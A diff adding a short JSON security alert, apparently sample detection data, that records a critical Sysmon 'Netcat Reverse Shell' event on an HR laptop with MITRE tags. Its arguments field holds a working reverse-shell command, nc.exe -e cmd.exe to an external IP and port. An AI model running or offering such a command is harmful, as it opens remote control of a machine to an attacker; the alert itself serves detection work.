@@ -1,0 +1,13 @@
+{
+  "alert_id": "002",
+  "timestamp": "2025-02-18T11:05:12Z",
+  "sensor": "Sysmon (Event 1)",
+  "rule_name": "Netcat Reverse Shell",
+  "severity": "critical",
+  "source_host": "HR-LAPTOP-02",
+  "source_ip": "192.168.2.44",
+  "process_created": "nc.exe",
+  "arguments": "-e cmd.exe 45.33.22.11 4444",
+  "parent_process": "unknown",
+  "mitre_ttps": ["T1059.003", "TA0002", "TA0011"]
+}
